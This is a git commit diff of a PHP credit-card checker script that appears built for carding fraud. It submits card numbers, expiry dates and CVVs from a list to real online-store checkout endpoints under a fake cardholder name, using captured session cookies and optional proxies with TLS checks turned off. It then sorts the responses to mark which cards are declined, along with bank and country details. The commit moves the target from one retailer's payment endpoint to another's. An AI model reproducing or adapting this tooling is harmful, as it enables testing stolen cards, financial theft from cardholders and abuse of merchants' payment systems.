f9d81e998ecd5512ce70a7bab611fdad73b3ee25
Hotshot <pubgkittu@gmail.com>
2020-05-24 23:40:26 -0700

    Update api.php

--- api.php
+++ api.php
@@ -150,50 +150,50 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
  // Request 1
 
 
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcSavePaymentInfo/');
+// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// curl_setopt($ch, CURLOPT_POST, 1);
+// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// // curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
+// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
+// # Uncomment the upper two lines if you have filled the upper login details
+// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+// 'accept: */*',
+// 'accept-encoding: gzip, deflate, br',
+// 'accept-language: en-US,en;q=0.9',
+// 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+// 'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
+// 'origin: https://www.europeanestheticshop.com',
+// 'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
+// 'user-agent: '.$browser.''
+// ));
+// curl_setopt($ch, CURLOPT_POSTFIELDS, 'CardholderName=Vincent+Warner&CardNumber='.$cc.'&ExpireMonth='.$mes1.'&ExpireYear='.$ano.'&CardCode='.$cvv.'');
+
+// $b_pago = curl_exec($ch);
+
+// curl_close($ch);
+
+//    // echo $b_pago;
+// // $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
+// // // $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
+// // $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+// // $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+// // $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+// // $category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
+
+
+
+
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcSavePaymentInfo/');
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
-# Uncomment the upper two lines if you have filled the upper login details
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: */*',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
-'origin: https://www.europeanestheticshop.com',
-'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
-'user-agent: '.$browser.''
-));
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'CardholderName=Vincent+Warner&CardNumber='.$cc.'&ExpireMonth='.$mes1.'&ExpireYear='.$ano.'&CardCode='.$cvv.'');
-
-$b_pago = curl_exec($ch);
-
-curl_close($ch);
-
-   // echo $b_pago;
-// $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
-// // $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
-// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-// $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-// $category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
-
-
-
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcConfirmOrder/');
+curl_setopt($ch, CURLOPT_URL, 'https://www.shavershop.com.au/on/demandware.store/Sites-Shaver_Shop_au-Site/en_AU/SPCOrder-Submit');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -222,18 +222,19 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: */*',
+'accept: application/json, text/javascript, */*; q=0.01',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
-'origin: https://www.europeanestheticshop.com',
-'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
+'content-type: application/json',
+'cookie: __cfduid=d476479d706a9098039eb3ee3a05c7b601590342176; cqcid=acFGaNnBj7LMJNMdEvaeSYobHJ; dwanonymous_ae4f5672fcdba78701858757b10b0f04=acFGaNnBj7LMJNMdEvaeSYobHJ; __cq_dnt=0; dw_dnt=0; BVImplmain_site=19316; dw=1; dw_cookies_accepted=1; leadGenerationPopUp=true; __cqact=%5B%7B%22activityType%22%3A%22customerSignup%22%2C%22parameters%22%3A%7B%22cookieId%22%3A%22acFGaNnBj7LMJNMdEvaeSYobHJ%22%2C%22userId%22%3A%22ODI8BjeCIV7bqOi369qnPiJ9rVcfKCfbPKbKd6KAORw%3D%22%2C%22emailId%22%3A%22pubgkittu%40gmail.com%22%2C%22realm%22%3A%22ABCZ%22%2C%22siteId%22%3A%22Shaver_Shop_au%22%2C%22instanceType%22%3A%22prd%22%7D%7D%5D; sid=zy-T2yJI_DIaaxJYwLa7BZMZKJHIoWiLTRI; dwac_f5c2891e49332fe2bfa511a0d9=zy-T2yJI_DIaaxJYwLa7BZMZKJHIoWiLTRI%3D|dw-only|||AUD|false|Australia%2FSydney|true; dwsid=y3YAVOXrUwRF7WvhKKM_JJdAux4PAse9EpTYWzbqktalAX7f955OZICKc5nRYZBLMvsYNse89gMMvnWsyYvurA==',
+'origin: https://www.shavershop.com.au',
+'referer: https://www.shavershop.com.au/checkout',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethod":"CREDIT_CARD","addEmailToList":false,"creditCard":{"owner":"Vincent Warner","number":"'.$cc.'","type":"Visa","expiration":{"month":'.$mes1.',"year":'.$ano.'},"cvn":"'.$cvv.'","saveCard":false,"deviceFingerprint":""}}');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -244,7 +245,7 @@ if (curl_errno($ch)) {
 }
 curl_close($ch);
 
-$message = trim(strip_tags(getstr($result,'div class=\"message-error\"\u003e\r\n                    \u003cul\u003e\r\n                            \u003cli\u003e','\u003c/li\u003e\r\n                    \u003c/ul\u003e\r\n                \u003c/div\u003e\r\n        \u003c/div\u003e\r\n    \r\n\u003c/div\u003e\r\n"')));
+$message = trim(strip_tags(getstr($result,'"message":"','"')));
  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
 
@@ -252,7 +253,7 @@ $message = trim(strip_tags(getstr($result,'div class=\"message-error\"\u003e\r\n
 //////////////////////// BIN INFO ////////////////////////////////
 
 /////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'Payment error')){
+if(strpos($result,'"error"')){
        echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
 
 
